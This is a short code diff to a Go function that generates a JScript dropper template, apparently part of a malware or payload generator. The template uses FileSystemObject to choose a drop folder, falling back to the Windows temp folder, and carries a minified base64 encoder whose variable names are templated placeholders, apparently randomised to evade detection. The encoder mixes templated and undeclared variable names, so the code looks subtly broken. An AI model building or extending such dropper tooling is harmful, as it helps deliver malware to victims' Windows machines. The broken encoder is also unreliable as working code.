@@ -220,7 +220,12 @@ func JSfile(encodeType string, outDir string) string {
 	
 
 	var {{.Variables.fso}} = new ActiveXObject("Scripting.FileSystemObject");
-	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetFolder("` + outDir + `");
+
+	if ({{.Variables.fso}}.FileExists("` + outDir + `") == 0) {
+		var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);
+	} else {
+		var {{.Variables.dropPath}} = {{.Variables.fso}}.GetFolder("` + outDir + `");
+	}
 
     var {{.Variables.base6411}}={ {{.Variables.characters}}:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function({{.Variables.atest}}){ {{.Variables.base6411}}.{{.Variables.characters}};var {{.Variables.rtest}}="",{{.Variables.ctest}}=0;do{var {{.Variables.etest}}={{.Variables.atest}}.charCodeAt({{.Variables.ctest}}++),{{.Variables.ttest}}={{.Variables.atest}}.charCodeAt(c++),{{.Variables.htest}}=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,{{.Variables.rtest}}+={{.Variables.base6411}}.{{.Variables.characters}}.charAt(s)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(A)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(o)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(B)}while(c<a.length);return {{.Variables.rtest}}}};
 	`
